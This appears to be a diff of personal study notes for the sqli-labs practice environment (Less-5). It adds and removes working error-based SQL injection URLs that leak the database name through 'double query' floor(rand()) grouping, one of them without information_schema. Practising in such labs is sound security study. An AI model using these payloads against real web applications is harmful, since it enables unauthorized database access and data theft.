@@ -1,16 +1,13 @@
 Double query:
 
 http://localhost/sqli-labs/Less-5/index.php?id=1'-- -
- 
-
-http://localhost/sqli-labs/Less-5/index.php?id=4' union select 1,count(*), concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor(rand()*2))as dump from information_schema.columns group by dump-- -
 
 
 http://localhost/sqli-labs/Less-5/index.php?id=4' union select 1,count(*), concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor(rand()*2))as dump from information_schema.columns group by dump-- -
 
 
-
-
+Without information_schema :
+=>  http://localhost/sqli-labs/Less-5/index.php?id=4' or (select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2))x from (select 1 union select 2 union select 3)t group by x having min(0))-- -
 
 
 
